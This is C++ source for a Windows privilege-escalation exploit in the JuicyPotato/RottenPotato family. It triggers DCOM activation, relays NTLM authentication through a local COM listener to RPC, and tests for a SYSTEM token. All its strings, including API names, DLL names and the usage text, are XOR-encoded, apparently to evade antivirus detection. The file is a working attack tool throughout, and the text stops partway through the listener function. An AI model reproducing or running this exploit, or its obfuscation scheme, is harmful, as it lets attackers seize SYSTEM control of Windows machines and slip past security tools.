#include "stdafx.h"
#include "MSFRottenPotato.h"
#include "IStorageTrigger.h"
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h> 
#include <userenv.h>
#include <assert.h>
#include <tchar.h>
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include <tchar.h>
#include <winsafer.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma comment(lib, "userenv.lib")

int Juicy(wchar_t *, BOOL);
wchar_t *olestr;
wchar_t *g_port;
wchar_t *rpcserver;
wchar_t *rpcport;
char dcom_port[12];
char dcom_ip[17];

static const char VERSION[] = "0.1";
BOOL TEST_mode = FALSE;
HANDLE elevated_token, duped_token;

int PotatoAPI::newConnection;
wchar_t *processtype = NULL;
wchar_t *processargs = NULL;
wchar_t *processname = NULL;

int IsTokenSystem(HANDLE tok)
{
	
	 char  hid__S__S__02vFz3sNvUsB[] = {'\x60','\x16','\x7e','\x60','\x16','\x19','\x60','\x16','\x4f','\x45'};
 char k_gN9hcacmtLxw = '\x45';
for(int i = 0; i < sizeof(hid__S__S__02vFz3sNvUsB) / sizeof(hid__S__S__02vFz3sNvUsB[0]); i++){
hid__S__S__02vFz3sNvUsB[i] = hid__S__S__02vFz3sNvUsB[i] ^ k_gN9hcacmtLxw;
}

	 wchar_t  hid_S_Y_S__u1xjmDV1VIEB[] = {'\x16','\x1c','\x16','\x11','\x0','\x8','\x45'};
 wchar_t k_kmBXlX1oXi4f = '\x45';
for(int i = 0; i < sizeof(hid_S_Y_S__u1xjmDV1VIEB) / sizeof(hid_S_Y_S__u1xjmDV1VIEB[0]); i++){
hid_S_Y_S__u1xjmDV1VIEB[i] = hid_S_Y_S__u1xjmDV1VIEB[i] ^ k_kmBXlX1oXi4f;
}
	typedef bool(__stdcall* _GetTokenInformation)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
	TCHAR  hid_Advapi_sazbvzQ7OaAY[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_dD9TXViCSN6C = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_sazbvzQ7OaAY) / sizeof(hid_Advapi_sazbvzQ7OaAY[0]); i++){
hid_Advapi_sazbvzQ7OaAY[i] = hid_Advapi_sazbvzQ7OaAY[i] ^ k_dD9TXViCSN6C;
}

	HMODULE hid_hHandl_spIsfo9ViQgc = LoadLibrary(hid_Advapi_sazbvzQ7OaAY);
	char  hid_GetTok_5lgpyMENzJAX[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_HzaVeFrcYNfe = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_5lgpyMENzJAX) / sizeof(hid_GetTok_5lgpyMENzJAX[0]); i++){
hid_GetTok_5lgpyMENzJAX[i] = hid_GetTok_5lgpyMENzJAX[i] ^ k_HzaVeFrcYNfe;
}

	_GetTokenInformation hid_GetTok_GeiQcywp30Un = (_GetTokenInformation) GetProcAddress(hid_hHandl_spIsfo9ViQgc, hid_GetTok_5lgpyMENzJAX);
	TCHAR  hid_Advapi_7kTRo3o65k4c[] = {'\x4','\x21','\x33','\x24','\x35','\x2c','\x76','\x77','\x6b','\x21','\x29','\x29','\x45'};
TCHAR k_svhslZFdDBvZ = '\x45';
for(int i = 0; i < sizeof(hid_Advapi_7kTRo3o65k4c) / sizeof(hid_Advapi_7kTRo3o65k4c[0]); i++){
hid_Advapi_7kTRo3o65k4c[i] = hid_Advapi_7kTRo3o65k4c[i] ^ k_svhslZFdDBvZ;
}

	HMODULE hid_hHandl_HMUWhL3xhYFY = LoadLibrary(hid_Advapi_7kTRo3o65k4c);
	char  hid_GetTok_oY67o0Ccr7Gu[] = {'\x2','\x20','\x31','\x11','\x2a','\x2e','\x20','\x2b','\xc','\x2b','\x23','\x2a','\x37','\x28','\x24','\x31','\x2c','\x2a','\x2b','\x45'};
char k_FBKLSp3N1MPd = '\x45';
for(int i = 0; i < sizeof(hid_GetTok_oY67o0Ccr7Gu) / sizeof(hid_GetTok_oY67o0Ccr7Gu[0]); i++){
hid_GetTok_oY67o0Ccr7Gu[i] = hid_GetTok_oY67o0Ccr7Gu[i] ^ k_FBKLSp3N1MPd;
}

	_GetTokenInformation hid_GetTok_nmQos3EUWhMg = (_GetTokenInformation) GetProcAddress(hid_hHandl_HMUWhL3xhYFY, hid_GetTok_oY67o0Ccr7Gu);
DWORD Size, UserSize, DomainSize;
	SID *sid;
	SID_NAME_USE SidType;
	TCHAR UserName[64], DomainName[64];
	TOKEN_USER *User;
	Size = 0;
	hid_GetTok_GeiQcywp30Un(tok, TokenUser, NULL, 0, &Size);
	if (!Size)
		return FALSE;

	User = (TOKEN_USER *)malloc(Size);
	assert(User);
	hid_GetTok_nmQos3EUWhMg(tok, TokenUser, User, Size, &Size);
	assert(Size);
	Size = GetLengthSid(User->User.Sid);
	assert(Size);
	sid = (SID *)malloc(Size);
	assert(sid);

	CopySid(Size, sid, User->User.Sid);
	UserSize = (sizeof UserName / sizeof *UserName) - 1;
	DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;
	LookupAccountSid(NULL, sid, UserName, &UserSize, DomainName, &DomainSize, &SidType);
	free(sid);

	printf(hid__S__S__02vFz3sNvUsB, olestr, DomainName, UserName);
	if (!_wcsicmp(UserName, hid_S_Y_S__u1xjmDV1VIEB))
		return 1;

	return 0;
}

void usage()
{
	
	 char  hid_JuicyP_1OA2b6lDTX3z[] = {'\xf','\x30','\x2c','\x26','\x3c','\x15','\x2a','\x31','\x24','\x31','\x2a','\x65','\x33','\x60','\x36','\x65','\x4f','\x4f','\x45'};
 char k_cswwJWEasfDk = '\x45';
for(int i = 0; i < sizeof(hid_JuicyP_1OA2b6lDTX3z) / sizeof(hid_JuicyP_1OA2b6lDTX3z[0]); i++){
hid_JuicyP_1OA2b6lDTX3z[i] = hid_JuicyP_1OA2b6lDTX3z[i] ^ k_cswwJWEasfDk;
}

	 char  hid_Mandat_cuibi5fuGFuf[] = {'\x8','\x24','\x2b','\x21','\x24','\x31','\x2a','\x37','\x3c','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x31','\x65','\x26','\x37','\x20','\x24','\x31','\x20','\x35','\x37','\x2a','\x26','\x20','\x36','\x36','\x65','\x26','\x24','\x29','\x29','\x7f','\x65','\x79','\x31','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x12','\x2c','\x31','\x2d','\x11','\x2a','\x2e','\x20','\x2b','\x12','\x69','\x65','\x79','\x30','\x7b','\x65','\x6','\x37','\x20','\x24','\x31','\x20','\x15','\x37','\x2a','\x26','\x20','\x36','\x36','\x4','\x36','\x10','\x36','\x20','\x37','\x69','\x65','\x79','\x6f','\x7b','\x65','\x31','\x37','\x3c','\x65','\x27','\x2a','\x31','\x2d','\x4f','\x68','\x35','\x65','\x79','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x7b','\x7f','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x31','\x2a','\x65','\x29','\x24','\x30','\x2b','\x26','\x2d','\x4f','\x68','\x29','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x4f','\x45'};
 char k_i3fMZTaarYi7 = '\x45';
for(int i = 0; i < sizeof(hid_Mandat_cuibi5fuGFuf) / sizeof(hid_Mandat_cuibi5fuGFuf[0]); i++){
hid_Mandat_cuibi5fuGFuf[i] = hid_Mandat_cuibi5fuGFuf[i] ^ k_i3fMZTaarYi7;
}

	 char  hid_Option_1IYU3Xu7KJjV[] = {'\xa','\x35','\x31','\x2c','\x2a','\x2b','\x24','\x29','\x65','\x24','\x37','\x22','\x36','\x7f','\x65','\x4f','\x68','\x28','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x6','\xa','\x8','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x24','\x65','\x79','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x7b','\x7f','\x65','\x26','\x2a','\x28','\x28','\x24','\x2b','\x21','\x65','\x29','\x2c','\x2b','\x20','\x65','\x24','\x37','\x22','\x30','\x28','\x20','\x2b','\x31','\x65','\x31','\x2a','\x65','\x35','\x24','\x36','\x36','\x65','\x31','\x2a','\x65','\x35','\x37','\x2a','\x22','\x37','\x24','\x28','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\xb','\x10','\x9','\x9','\x6c','\x4f','\x68','\x2e','\x65','\x79','\x2c','\x35','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x2c','\x35','\x65','\x24','\x21','\x21','\x37','\x20','\x36','\x36','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x6c','\x4f','\x68','\x2b','\x65','\x79','\x35','\x2a','\x37','\x31','\x7b','\x7f','\x65','\x17','\x15','\x6','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x65','\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x35','\x2a','\x37','\x31','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x74','\x76','\x70','\x6c','\x4f','\x68','\x26','\x65','\x79','\x3e','\x26','\x29','\x36','\x2c','\x21','\x38','\x7b','\x7f','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x6d','\x21','\x20','\x23','\x24','\x30','\x29','\x31','\x65','\x7','\xc','\x11','\x16','\x7f','\x3e','\x71','\x7c','\x7c','\x74','\x21','\x76','\x71','\x27','\x68','\x7d','\x75','\x24','\x74','\x68','\x71','\x77','\x7c','\x74','\x68','\x7d','\x76','\x27','\x73','\x68','\x76','\x76','\x77','\x7d','\x76','\x73','\x73','\x27','\x7c','\x75','\x7c','\x72','\x38','\x6c','\x4f','\x68','\x3f','\x65','\x2a','\x2b','\x29','\x3c','\x65','\x31','\x20','\x36','\x31','\x65','\x6','\x9','\x16','\xc','\x1','\x65','\x24','\x2b','\x21','\x65','\x35','\x37','\x2c','\x2b','\x31','\x65','\x31','\x2a','\x2e','\x20','\x2b','\x62','\x36','\x65','\x30','\x36','\x20','\x37','\x4f','\x45'};
 char k_puc9eg9pHjG6 = '\x45';
for(int i = 0; i < sizeof(hid_Option_1IYU3Xu7KJjV) / sizeof(hid_Option_1IYU3Xu7KJjV[0]); i++){
hid_Option_1IYU3Xu7KJjV[i] = hid_Option_1IYU3Xu7KJjV[i] ^ k_puc9eg9pHjG6;
}
printf(hid_JuicyP_1OA2b6lDTX3z, VERSION);

	printf(hid_Mandat_cuibi5fuGFuf
	);

	printf("\n\n");
	printf(hid_Option_1IYU3Xu7KJjV
	);
}

PotatoAPI::PotatoAPI() {
	comSendQ = new BlockingQueue<char*>();
	rpcSendQ = new BlockingQueue<char*>();
	newConnection = 0;
	negotiator = new LocalNegotiator();
	return;
}

DWORD PotatoAPI::startRPCConnectionThread() {
	DWORD ThreadID;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartRPCConnection, (void*)this, 0, &ThreadID);
	return ThreadID;
}

DWORD PotatoAPI::startCOMListenerThread() {
	DWORD ThreadID;
	HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)staticStartCOMListener, (void*)this, 0, &ThreadID);

	return ThreadID;
}

DWORD WINAPI PotatoAPI::staticStartRPCConnection(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startRPCConnection();
}

DWORD WINAPI PotatoAPI::staticStartCOMListener(void* Param) {
	PotatoAPI* This = (PotatoAPI*)Param;
	return This->startCOMListener();
}

int PotatoAPI::findNTLMBytes(char *bytes, int len) {
	//Find the NTLM bytes in a packet and return the index to the start of the NTLMSSP header.
	//The NTLM bytes (for our purposes) are always at the end of the packet, so when we find the header,
	//we can just return the index
	char pattern[7] = { 0x4E, 0x54, 0x4C, 0x4D, 0x53, 0x53, 0x50 };
	int pIdx = 0;
	int i;
	for (i = 0; i < len; i++) {
		if (bytes[i] == pattern[pIdx]) {
			pIdx = pIdx + 1;
			if (pIdx == 7) return (i - 6);
		}
		else {
			pIdx = 0;
		}
	}
	return -1;
}

int PotatoAPI::processNtlmBytes(char *bytes, int len) {
	
	 char  hid_Error__2PrfDCJSMH9a[] = {'\x0','\x37','\x37','\x2a','\x37','\x65','\x68','\x65','\x10','\x2b','\x2e','\x2b','\x2a','\x32','\x2b','\x65','\xb','\x11','\x9','\x8','\x65','\x28','\x20','\x36','\x36','\x24','\x22','\x20','\x65','\x31','\x3c','\x35','\x20','\x6b','\x6b','\x6b','\x45'};
 char k_pszGT8GElGhs = '\x45';
for(int i = 0; i < sizeof(hid_Error__2PrfDCJSMH9a) / sizeof(hid_Error__2PrfDCJSMH9a[0]); i++){
hid_Error__2PrfDCJSMH9a[i] = hid_Error__2PrfDCJSMH9a[i] ^ k_pszGT8GElGhs;
}
int ntlmLoc = findNTLMBytes(bytes, len);
	if (ntlmLoc == -1) return -1;

	int messageType = bytes[ntlmLoc + 8];
	switch (messageType) {
		case 1:
			//NTLM type 1 message
			negotiator->handleType1(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 2:
			//NTLM type 2 message
			negotiator->handleType2(bytes + ntlmLoc, len - ntlmLoc);
			break;
		case 3:
			//NTLM type 3 message
			negotiator->handleType3(bytes + ntlmLoc, len - ntlmLoc);
			break;
		default:
			printf(hid_Error__2PrfDCJSMH9a);
			return -1;
			break;
	}
	return 0;
}

int checkForNewConnection(SOCKET* ListenSocket, SOCKET* ClientSocket) {
	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(*ListenSocket, &readSet);
	timeval timeout;
	timeout.tv_sec = 1;  // Zero timeout (poll)
	timeout.tv_usec = 0;
	if (select(*ListenSocket, &readSet, NULL, NULL, &timeout) == 1) {
		*ClientSocket = accept(*ListenSocket, NULL, NULL);
		return 1;
	}
	return 0;
}

int PotatoAPI::triggerDCOM(void)
{
	
	 wchar_t  hid________7put1II1vc1x[] = {'\x3e','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x68','\x6','\x75','\x75','\x75','\x68','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x75','\x71','\x73','\x38','\x45'};
 wchar_t k_3EF3WXuG0ihS = '\x45';
for(int i = 0; i < sizeof(hid________7put1II1vc1x) / sizeof(hid________7put1II1vc1x[0]); i++){
hid________7put1II1vc1x[i] = hid________7put1II1vc1x[i] ^ k_3EF3WXuG0ihS;
}
CoInitialize(nullptr);

	//Create IStorage object
	IStorage *stg = NULL;
	ILockBytes *lb = NULL;
	HRESULT res;

	res = CreateILockBytesOnHGlobal(NULL, true, &lb);
	res = StgCreateDocfileOnILockBytes(lb, STGM_CREATE | STGM_READWRITE | STGM_SHARE_EXCLUSIVE, 0, &stg);

	//Initialze IStorageTrigger object
	IStorageTrigger* t = new IStorageTrigger(stg);

	CLSID clsid;
	CLSIDFromString(olestr, &clsid);
	CLSID tmp;
	//IUnknown IID
	CLSIDFromString(hid________7put1II1vc1x, &tmp);
	MULTI_QI qis[1];
	qis[0].pIID = &tmp;
	qis[0].pItf = NULL;
	qis[0].hr = 0;

	//Call CoGetInstanceFromIStorage
	HRESULT status = CoGetInstanceFromIStorage(NULL, &clsid, NULL, CLSCTX_LOCAL_SERVER, t, 1, qis);

	fflush(stdout);
	return 0;
}

int PotatoAPI::startRPCConnection(void) {
	
	 char  hid_WSASta_Ai4YMxCWfhj9[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_y2tmhWRKqcwP = '\x45';
for(int i = 0; i < sizeof(hid_WSASta_Ai4YMxCWfhj9) / sizeof(hid_WSASta_Ai4YMxCWfhj9[0]); i++){
hid_WSASta_Ai4YMxCWfhj9[i] = hid_WSASta_Ai4YMxCWfhj9[i] ^ k_y2tmhWRKqcwP;
}

	 char  hid________DL2naG11jiOP[] = {'\x74','\x77','\x72','\x6b','\x75','\x6b','\x75','\x6b','\x74','\x45'};
 char k_ckr7A63loKDR = '\x45';
for(int i = 0; i < sizeof(hid________DL2naG11jiOP) / sizeof(hid________DL2naG11jiOP[0]); i++){
hid________DL2naG11jiOP[i] = hid________DL2naG11jiOP[i] ^ k_ckr7A63loKDR;
}

	 char  hid_getadd_Gdb8F9RSeMD1[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_SGWDvTEbUmUG = '\x45';
for(int i = 0; i < sizeof(hid_getadd_Gdb8F9RSeMD1) / sizeof(hid_getadd_Gdb8F9RSeMD1[0]); i++){
hid_getadd_Gdb8F9RSeMD1[i] = hid_getadd_Gdb8F9RSeMD1[i] ^ k_SGWDvTEbUmUG;
}

	 char  hid_socket_luxf0f5LyXZh[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
 char k_Ebc2OMNDOCHN = '\x45';
for(int i = 0; i < sizeof(hid_socket_luxf0f5LyXZh) / sizeof(hid_socket_luxf0f5LyXZh[0]); i++){
hid_socket_luxf0f5LyXZh[i] = hid_socket_luxf0f5LyXZh[i] ^ k_Ebc2OMNDOCHN;
}

	 char  hid_Unable_AF7tUWPzUjQA[] = {'\x10','\x2b','\x24','\x27','\x29','\x20','\x65','\x31','\x2a','\x65','\x26','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x65','\x31','\x2a','\x65','\x36','\x20','\x37','\x33','\x20','\x37','\x64','\x4f','\x45'};
 char k_Sz3x7FFTdh10 = '\x45';
for(int i = 0; i < sizeof(hid_Unable_AF7tUWPzUjQA) / sizeof(hid_Unable_AF7tUWPzUjQA[0]); i++){
hid_Unable_AF7tUWPzUjQA[i] = hid_Unable_AF7tUWPzUjQA[i] ^ k_Sz3x7FFTdh10;
}

	 char  hid_RPC____FAks8HacciY7[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_0IOqkIw79eLa = '\x45';
for(int i = 0; i < sizeof(hid_RPC____FAks8HacciY7) / sizeof(hid_RPC____FAks8HacciY7[0]); i++){
hid_RPC____FAks8HacciY7[i] = hid_RPC____FAks8HacciY7[i] ^ k_0IOqkIw79eLa;
}

	 char  hid_RPC____aD3u4QpYmZAe[] = {'\x17','\x15','\x6','\x68','\x7b','\x65','\x6','\x2a','\x2b','\x2b','\x20','\x26','\x31','\x2c','\x2a','\x2b','\x65','\x26','\x29','\x2a','\x36','\x20','\x21','\x4f','\x45'};
 char k_0zTM1QfmXtTx = '\x45';
for(int i = 0; i < sizeof(hid_RPC____aD3u4QpYmZAe) / sizeof(hid_RPC____aD3u4QpYmZAe[0]); i++){
hid_RPC____aD3u4QpYmZAe[i] = hid_RPC____aD3u4QpYmZAe[i] ^ k_0zTM1QfmXtTx;
}

	 char  hid_RPC____GJsCdCd5suE6[] = {'\x17','\x15','\x6','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_d0k5Yy38KRFn = '\x45';
for(int i = 0; i < sizeof(hid_RPC____GJsCdCd5suE6) / sizeof(hid_RPC____GJsCdCd5suE6[0]); i++){
hid_RPC____GJsCdCd5suE6[i] = hid_RPC____GJsCdCd5suE6[i] ^ k_d0k5Yy38KRFn;
}
const int DEFAULT_BUFLEN = 4096;

	fflush(stdout);
	WSADATA wsaData;

	struct addrinfo *result = NULL,
		*ptr = NULL,
		hints;

	char *sendbuf;
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf(hid_WSASta_Ai4YMxCWfhj9, iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address and port
	char myhost[24];
	char myport[12];

	if (rpcserver != NULL) {
		memset(myhost, 0, 24);
		wcstombs(myhost, rpcserver, 24);
	}
	else {
		strcpy(myhost, hid________DL2naG11jiOP);
	}

	if (rpcport != NULL) {
		memset(myport, 0, 12);
		wcstombs(myport, rpcport, 12);
	}
	else {
		strcpy(myport, "135");
	}

	iResult = getaddrinfo(myhost, myport, &hints, &result);
	if (iResult != 0) {
		printf(hid_getadd_Gdb8F9RSeMD1, iResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address
	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		// Create a SOCKET for connecting to server
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf(hid_socket_luxf0f5LyXZh, WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server
		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}

		break;
	}

	if (ConnectSocket == INVALID_SOCKET) {
		printf(hid_Unable_AF7tUWPzUjQA);
		WSACleanup();
		return 1;
	}

	// Send/Receive until the peer closes the connection
	fflush(stdout);
	do {
		//Monitor our sendQ until we have some data to send
		int *len = (int*)rpcSendQ->wait_pop();
		
		fflush(stdout);
		sendbuf = rpcSendQ->wait_pop();

		//Check if we should be opening a new socket before we send the data
		if (newConnection == 1) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			int y = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			newConnection = 0;
		}

		iResult = send(ConnectSocket, sendbuf, *len, 0);
		if (iResult == SOCKET_ERROR) {
			printf(hid_RPC____FAks8HacciY7, WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 0;
		}

		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			comSendQ->push((char*)&iResult);
			comSendQ->push(recvbuf);
		}
		else if (iResult == 0) {
			printf(hid_RPC____aD3u4QpYmZAe);
		}
		else {
			printf(hid_RPC____GJsCdCd5suE6, WSAGetLastError());
			return 0;
		}

	} while (iResult > 0);

	//printf("last iResult:%d\n", iResult);
	fflush(stdout);
	// cleanup
	iResult = shutdown(ConnectSocket, SD_SEND);
	closesocket(ConnectSocket);
	WSACleanup();

	return 0;
}

int PotatoAPI::startCOMListener(void) {
	
	 char  hid_WSASta_bdWQ392ojb5W[] = {'\x12','\x16','\x4','\x16','\x31','\x24','\x37','\x31','\x30','\x35','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_1TcU5GrhQ4yU = '\x45';
for(int i = 0; i < sizeof(hid_WSASta_bdWQ392ojb5W) / sizeof(hid_WSASta_bdWQ392ojb5W[0]); i++){
hid_WSASta_bdWQ392ojb5W[i] = hid_WSASta_bdWQ392ojb5W[i] ^ k_1TcU5GrhQ4yU;
}

	 char  hid_getadd_MrUNb32fPZl6[] = {'\x22','\x20','\x31','\x24','\x21','\x21','\x37','\x2c','\x2b','\x23','\x2a','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_u4lCMKLnydCo = '\x45';
for(int i = 0; i < sizeof(hid_getadd_MrUNb32fPZl6) / sizeof(hid_getadd_MrUNb32fPZl6[0]); i++){
hid_getadd_MrUNb32fPZl6[i] = hid_getadd_MrUNb32fPZl6[i] ^ k_u4lCMKLnydCo;
}

	 char  hid_socket_WK8BDodL8dkA[] = {'\x36','\x2a','\x26','\x2e','\x20','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x29','\x21','\x4f','\x45'};
 char k_WAwGKUyas76a = '\x45';
for(int i = 0; i < sizeof(hid_socket_WK8BDodL8dkA) / sizeof(hid_socket_WK8BDodL8dkA[0]); i++){
hid_socket_WK8BDodL8dkA[i] = hid_socket_WK8BDodL8dkA[i] ^ k_WAwGKUyas76a;
}

	 char  hid_bind_f_gNsvEpoqKTdi[] = {'\x27','\x2c','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_k5ktdUFqtHYy = '\x45';
for(int i = 0; i < sizeof(hid_bind_f_gNsvEpoqKTdi) / sizeof(hid_bind_f_gNsvEpoqKTdi[0]); i++){
hid_bind_f_gNsvEpoqKTdi[i] = hid_bind_f_gNsvEpoqKTdi[i] ^ k_k5ktdUFqtHYy;
}

	 char  hid_listen_ghREhz6mrnwJ[] = {'\x29','\x2c','\x36','\x31','\x20','\x2b','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_ZmtRMjtl6ovF = '\x45';
for(int i = 0; i < sizeof(hid_listen_ghREhz6mrnwJ) / sizeof(hid_listen_ghREhz6mrnwJ[0]); i++){
hid_listen_ghREhz6mrnwJ[i] = hid_listen_ghREhz6mrnwJ[i] ^ k_ZmtRMjtl6ovF;
}

	 char  hid_accept_x9tCexDNVyh1[] = {'\x24','\x26','\x26','\x20','\x35','\x31','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_K7xDXFt8Y0Kq = '\x45';
for(int i = 0; i < sizeof(hid_accept_x9tCexDNVyh1) / sizeof(hid_accept_x9tCexDNVyh1[0]); i++){
hid_accept_x9tCexDNVyh1[i] = hid_accept_x9tCexDNVyh1[i] ^ k_K7xDXFt8Y0Kq;
}

	 char  hid_COM____cAMk78UnBH2d[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x36','\x20','\x2b','\x21','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_KWSuler74QT2 = '\x45';
for(int i = 0; i < sizeof(hid_COM____cAMk78UnBH2d) / sizeof(hid_COM____cAMk78UnBH2d[0]); i++){
hid_COM____cAMk78UnBH2d[i] = hid_COM____cAMk78UnBH2d[i] ^ k_KWSuler74QT2;
}

	 char  hid_COM____pWs62Cbg4tsO[] = {'\x6','\xa','\x8','\x65','\x68','\x7b','\x65','\x37','\x20','\x26','\x33','\x65','\x23','\x24','\x2c','\x29','\x20','\x21','\x65','\x32','\x2c','\x31','\x2d','\x65','\x20','\x37','\x37','\x2a','\x37','\x7f','\x65','\x60','\x21','\x4f','\x45'};
 char k_k3PXqtDybOXg = '\x45';
for(int i = 0; i < sizeof(hid_COM____pWs62Cbg4tsO) / sizeof(hid_COM____pWs62Cbg4tsO[0]); i++){
hid_COM____pWs62Cbg4tsO[i] = hid_COM____pWs62Cbg4tsO[i] ^ k_k3PXqtDybOXg;
}

